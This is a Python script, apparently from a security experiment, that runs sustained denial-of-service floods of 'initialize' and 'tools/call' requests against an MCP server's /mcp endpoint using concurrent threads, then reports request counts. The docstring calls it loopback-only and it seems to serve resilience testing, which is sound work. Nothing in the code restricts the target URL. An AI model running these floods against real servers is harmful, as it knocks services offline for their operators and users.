"""Sustained flood subprocess for the practical experiment.

Lives in its own process so it cannot GIL-starve the parent's concurrent
benign probe. Loopback only.

Usage:
  python practical_attack.py v2_init_flood <base_url> <duration_s> <concurrency>
  python practical_attack.py v5_tool_flood <base_url> <duration_s> <concurrency>

Prints one JSON line: attempted, ok, failed, elapsed_s, sent_bytes.
"""
from __future__ import annotations

import json
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx

INIT_BODY = {
    "jsonrpc": "2.0", "id": 1, "method": "initialize",
    "params": {"protocolVersion": "2025-06-18", "capabilities": {},
               "clientInfo": {"name": "flood-attacker", "version": "1.0"}},
}
TIMEOUT_S = 5.0


def v2_flood(base_url: str, duration_s: float, concurrency: int) -> dict:
    stop_at = time.perf_counter() + duration_s
    attempted = ok = failed = sent = 0
    lock = threading.Lock()
    payload_n = len(json.dumps(INIT_BODY).encode())

    def worker():
        nonlocal attempted, ok, failed, sent
        limits = httpx.Limits(max_connections=4, max_keepalive_connections=4)
        with httpx.Client(timeout=TIMEOUT_S, limits=limits) as client:
            while time.perf_counter() < stop_at:
                try:
                    r = client.post(
                        f"{base_url}/mcp", json=INIT_BODY,
                        headers={"Accept": "application/json, text/event-stream"},
                    )
                    success = r.status_code == 200
                except httpx.HTTPError:
                    success = False
                with lock:
                    attempted += 1
                    sent += payload_n
                    if success:
                        ok += 1
                    else:
                        failed += 1

    t0 = time.perf_counter()
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futs = [ex.submit(worker) for _ in range(concurrency)]
        for f in as_completed(futs):
            f.result()
    return {"attempted": attempted, "ok": ok, "failed": failed,
            "elapsed_s": time.perf_counter() - t0, "sent_bytes": sent}


def v5_flood(base_url: str, duration_s: float, concurrency: int) -> dict:
    stop_at = time.perf_counter() + duration_s
    attempted = ok = failed = sent = 0
    lock = threading.Lock()
    echo_body = {
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "echo", "arguments": {"text": "flood"}},
    }
    echo_n = len(json.dumps(echo_body).encode())

    def worker():
        nonlocal attempted, ok, failed, sent
        with httpx.Client(timeout=TIMEOUT_S) as client:
            try:
                r = client.post(
                    f"{base_url}/mcp", json=INIT_BODY,
                    headers={"Accept": "application/json, text/event-stream"},
                )
                sid = r.headers.get("mcp-session-id")
                if not sid:
                    with lock:
                        attempted += 1
                        failed += 1
                    return
                client.post(
                    f"{base_url}/mcp",
                    json={"jsonrpc": "2.0", "method": "notifications/initialized"},
                    headers={"mcp-session-id": sid,
                             "Accept": "application/json, text/event-stream"},
                )
            except httpx.HTTPError:
                with lock:
                    attempted += 1
                    failed += 1
                return
            headers = {"mcp-session-id": sid,
                       "Accept": "application/json, text/event-stream",
                       "Content-Type": "application/json"}
            i = 0
            while time.perf_counter() < stop_at:
                body = dict(echo_body)
                body["id"] = 2 + i
                i += 1
                try:
                    r = client.post(f"{base_url}/mcp", json=body, headers=headers)
                    success = r.status_code == 200
                except httpx.HTTPError:
                    success = False
                with lock:
                    attempted += 1
                    sent += echo_n
                    if success:
                        ok += 1
                    else:
                        failed += 1

    t0 = time.perf_counter()
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futs = [ex.submit(worker) for _ in range(concurrency)]
        for f in as_completed(futs):
            f.result()
    return {"attempted": attempted, "ok": ok, "failed": failed,
            "elapsed_s": time.perf_counter() - t0, "sent_bytes": sent}


def main():
    vector = sys.argv[1]
    base_url = sys.argv[2]
    duration_s = float(sys.argv[3])
    concurrency = int(sys.argv[4])
    if vector == "v2_init_flood":
        out = v2_flood(base_url, duration_s, concurrency)
    elif vector == "v5_tool_flood":
        out = v5_flood(base_url, duration_s, concurrency)
    else:
        raise SystemExit(f"unknown vector {vector}")
    print(json.dumps(out), flush=True)


if __name__ == "__main__":
    main()
